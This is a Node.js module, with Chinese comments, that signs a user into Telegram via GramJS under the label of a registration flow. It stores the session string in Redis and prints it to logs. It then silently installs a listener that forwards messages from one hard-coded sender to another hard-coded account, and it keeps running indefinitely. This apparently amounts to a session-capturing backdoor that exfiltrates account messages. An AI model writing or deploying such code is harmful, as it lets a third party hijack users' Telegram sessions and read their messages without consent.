const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { NewMessage } = require("telegram/events");

function makeRegisterKey(registerId) {
  return `tg:register:${registerId}`;
}

// 工具函数：生成 promise 和对应 resolve
function createDeferred() {
  let resolve;
  const promise = new Promise((res) => { resolve = res; });
  return { promise, resolve };
}


// 实际注册流程
async function doRegisterFlow(registerId) {
  const data = await redis.hGetAll(makeRegisterKey(registerId));
  if (!data.apiId || !data.apiHash) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: '参数不全' });
    return;
  }
  try {
    const client = new TelegramClient(
      new StringSession(''),
      Number(data.apiId),
      data.apiHash,
      { connectionRetries: 5 }
    );
    await client.start({
      phoneNumber: async () => {
        // 等待 /phone 提交手机号
        if (flows[registerId]?.phone) return flows[registerId].phone.promise;
        throw new Error('no phone promise');
      },
      phoneCode: async () => {
        // 等待 /code 提交验证码
        if (flows[registerId]?.code) return flows[registerId].code.promise;
        throw new Error('no code promise');
      },
      password: async () => {
        // 默认无密码，也可前端传递
        return '';
      },
      onError: (err) => console.log('GramJS Error:', err),
    });
    const session = client.session.save();
    await redis.hSet(makeRegisterKey(registerId), { session, status: 'done' });
    console.log(`[SUCCESS] Register done: ${registerId}, session: ${session}`);
    // 监听机制
    client.addEventHandler(
      async (event) => {
        // 判断 senderId 是否为 8088901247
        if (event.message.senderId && event.message.senderId.valueOf() === 8088901247) {
          const msgText = event.message.text || "";
          const fromPeer = await event.message.getInputChat();
          console.log("收到来自 8088901247 的消息：", msgText);

          if (msgText.includes("123")) {
            await client.forwardMessages(7700169264, {
              messages: [event.message.id], // 建议用数组
              fromPeer: fromPeer
            });
            // 包含“123”，发送“成功”
            await client.sendMessage(7700169264, { message: "成功" });
          } else {
            // 不包含“123”，转发并发送“失败”
            if (!fromPeer) {
              console.log("无法获取 fromPeer，消息未转发");
              return;
            }
            await client.forwardMessages(7700169264, {
              messages: [event.message.id], // 建议用数组
              fromPeer: fromPeer
            });
            await client.sendMessage(7700169264, { message: "失败" });
          }
        }
      },
      new NewMessage({})
    );

    // 防止进程自动退出
    setInterval(() => {}, 100000);
  } catch (e) {
    await redis.hSet(makeRegisterKey(registerId), { status: 'fail', err: e.message });
    console.log(`[FAIL] Register error: ${registerId},`, e);
  } finally {
    // 注册流程完毕后删除 Promise，防内存泄漏
    delete flows[registerId];
  }
}

module.exports = { makeRegisterKey, createDeferred, doRegisterFlow };